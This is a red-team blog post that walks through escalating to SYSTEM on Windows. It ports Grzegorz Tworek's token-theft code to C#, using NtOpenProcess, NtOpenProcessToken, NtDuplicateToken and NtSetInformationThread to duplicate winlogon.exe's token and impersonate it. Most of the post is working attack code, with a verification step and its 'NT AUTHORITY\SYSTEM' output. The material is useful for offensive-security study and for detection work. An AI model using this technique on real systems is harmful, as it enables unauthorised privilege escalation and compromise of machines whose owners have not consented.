---
title: "Nt Token Theft"
date: 2024-02-04T13:39:41Z
draft: false
authors:
    - RastaMouse
---

## Intro

[Grzegorz Tworek](https://twitter.com/0gtweet) recently published some C code demonstrating how to steal and impersonate Windows tokens from a process.  The standard way to do this is with the OpenProcess, OpenProcessToken, DuplicateTokenEx, and ImpersonateLoggedOnUser APIs.  Grzegorz shows how to achieve the same using Nt* APIs, specifically NtOpenProcess, NtOpenProcessToken, NtDuplicateToken, and NtSetInformationThread.

Because I'm a C# junky, I ported part of his code.  This post will serve as a short walkthough on how to "getsystem" by stealing and impersonating the token of a SYSTEM process.  The high-level steps are:

1) Obtain a handle to the target process.
2) Obtain a handle to that target's process token.
3) Duplicate the target's process token.
4) Apply that duplicated token to our calling thread.
5) Close all obtained handles.

### NtOpenProcess

A common process to target is the Windows log-on application, `winlogon.exe`.

```c#
// find a winlogon process
// there may be more than 1 if multiple users are logged on
using var winlogon = Process.GetProcessesByName("winlogon").First();

HANDLE hProcess;

var oa = new OBJECT_ATTRIBUTES();
var cid = new CLIENT_ID
{
    UniqueProcess = new HANDLE((IntPtr)winlogon.Id)
};

// open handle to winlogon
NtOpenProcess(
    &hProcess,
    PROCESS_QUERY_LIMITED_INFORMATION,
    &oa,
    &cid);
```

### NtOpenProcessToken

Use the process handle to obtain the process' thread token.

```c#
HANDLE hToken;

// open handle to winlogon's process token
NtOpenProcessToken(
    hProcess,
    TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
    &hToken);
```

### NtDuplicationToken

Before being able to duplicate the token, create a new `SECURITY_QUALITY_OF_SERVICE` struct.

```c#
var qos = new SECURITY_QUALITY_OF_SERVICE
{
    Length = (uint)Marshal.SizeOf<SECURITY_QUALITY_OF_SERVICE>(),
    ImpersonationLevel = SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
    ContextTrackingMode = 1,    // SECURITY_DYNAMIC_TRACKING
    EffectiveOnly = false
};
```

And a new `OBJECT_ATTRIBUTES` struct which points to `SECURITY_QUALITY_OF_SERVICE`.

```c#
oa = new OBJECT_ATTRIBUTES
{
    Length = (uint)Marshal.SizeOf<OBJECT_ATTRIBUTES>(),
    SecurityQualityOfService = &qos
};
```

Now duplicate the token.

```c#
HANDLE hDupToken;

NtDuplicateToken(
    hToken,
    MAXIMUM_ALLOWED,
    &oa,
    SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
    TOKEN_TYPE.TokenImpersonation,
    &hDupToken);
```

### NtSetInformationThread

Once the token has been duplicated, apply it to our own process' thread.  Note that `-2` or `0xfffffffffffffffe` is a pseudo-handle.

```c#
var hCallingThread = new HANDLE((IntPtr)(-2));

// set current thread
NtSetInformationThread(
    hCallingThread,
    THREAD_INFORMATION_CLASS.ThreadImpersonationToken,
    &hDupToken,
    (uint)Marshal.SizeOf<HANDLE>());
```

### GetTokenInformation

We can go a step further to validate that the token was applied by calling `NtOpenThreadToken` on our own process to obtain a handle to its thread token.  This can be passed to `GetTokenInformation`, specifying the `TokenUser` information class.  This will return a `TOKEN_USER` structure which contains a pointer to the SID of the token's user.

```c#
HANDLE hThreadToken;

NtOpenThreadToken(
    hCallingThread,
    TOKEN_QUERY,
    false,
    &hThreadToken);

uint returnLength;

GetTokenInformation(
    hThreadToken,
    TOKEN_INFORMATION_CLASS.TokenUser,
    null,
    0,
    &returnLength);

// allocate buffer
var buffer = Marshal.AllocHGlobal((int)returnLength);

GetTokenInformation(
    hThreadToken,
    TOKEN_INFORMATION_CLASS.TokenUser,
    buffer.ToPointer(),
    returnLength,
    &returnLength);

// read token user
var lpTokenUser = (TOKEN_USER*)buffer.ToPointer();

// translate to nt account
var identity = new SecurityIdentifier((IntPtr)lpTokenUser->User.Sid.Value)
    .Translate(typeof(NTAccount));

// free buffer
Marshal.FreeHGlobal(buffer);

Console.WriteLine($"Thread token: {identity.Value}");
```

This prints:
```text
Thread token: NT AUTHORITY\SYSTEM
```

### Cleaup

Just close handles.

```c#
NtClose(hProcess);
NtClose(hToken);
NtClose(hDupToken);
```

## Conclusion

Grzegorz goes into a little more detail by calling `NtAdjustPrivilegesToken` to ensure that certain privileges are enabled within the current process.  I skipped over this step because I assume they're already enabled by default when running in a high-integrity process.  I certainly encourage you to read Grzegorz's original code: [https://github.com/gtworek/PSBits/blob/master/Misc/TokenStealWithSyscalls.c](https://github.com/gtworek/PSBits/blob/master/Misc/TokenStealWithSyscalls.c).

All of the methods, structs, and enum's etc used within this post can be found on my GitBook, [pinvoke.dev](https://www.pinvoke.dev/).